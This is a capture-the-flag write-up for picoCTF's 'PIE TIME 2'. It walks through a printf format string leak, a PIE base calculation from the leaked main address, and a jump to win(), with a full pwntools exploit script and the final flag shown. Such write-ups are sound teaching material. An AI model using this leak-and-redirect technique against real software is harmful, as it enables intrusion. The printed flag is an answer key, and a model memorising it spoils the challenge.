# PIE TIME 2

Author: Darkraicg492

Can you try to get the flag? I'm not revealing anything anymore!! Connect to the program with netcat:

$ nc rescued-float.picoctf.net 51740

The program's source code can be downloaded [here](vuln.c). The binary can be downloaded [here](vuln).

## Solution

We need to hit this function to print the flag:

```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}
```

We have this function where it takes user input and prints it directly with `printf`, this is a formatting string vulnerability:

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  ...
}
```

I objdump the binary to look where the `main` function is loacted in the binary:
```c
$ objdump -d ./vuln | grep "<main>:"
0000000000001400 <main>:
```

I use this payload to print the most stack pointers that fit in the `name` buffer:

```python
$ python3 -c "print('%p' + ' %p' * int(61/3))"
```

We get this output:

```c
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x561b1021e311 0x7f6bfb60b7a0 0x7f6bfb60b7a0 0x561b1021e34f (nil) 0x34000000340 0x7f6bfb60a5c0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa702520702520 (nil) 0x231ec9ad77626100 0x7ffc0fd58c80 0x561af70a7441 0x7ffc0fd58d20 0x7f6bfb427675
 enter the address to jump to, ex => 0x12345: 
```

The 19th address is interesting, as it ends in 441, this is our `main` function:

```c
0x55e07028c441
```

We take this leaked main address and find the difference between the remote address and our local address plus the offset:

```python
base = main_addr_leak - (elf.symbols["main"] + 0x41) # find the base address by finding the difference between our leaked main and our main plus the offset
```

Then we just jump to that address and win:

```python
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
#io = elf.process()
io = remote("rescued-float.picoctf.net", 49795)
#context.log_level = "debug"

# step 1: leak main address
io.sendlineafter(b":", b"%19$p")
io.recvuntil(b"0x")
main_addr_leak = int(io.recvline().strip(), 16)
log.info(f"Leaked main address + offset: {hex(main_addr_leak)}")

base = main_addr_leak - (elf.symbols["main"] + 0x41) # find the base address by finding the difference between our leaked main and our main plus the offset
calculated_win_addr = base + elf.symbols["win"]
log.info(f"Calculated win address: {hex(calculated_win_addr)}")

io.sendlineafter(b": ", hex(calculated_win_addr).encode())
io.recvuntil(b"You won!\n")
flag = io.recvline().strip().decode()
log.success(flag)

io.close()
```

**Flag:** `picoCTF{p13_5h0u1dn'7_134k_1ef23143}`
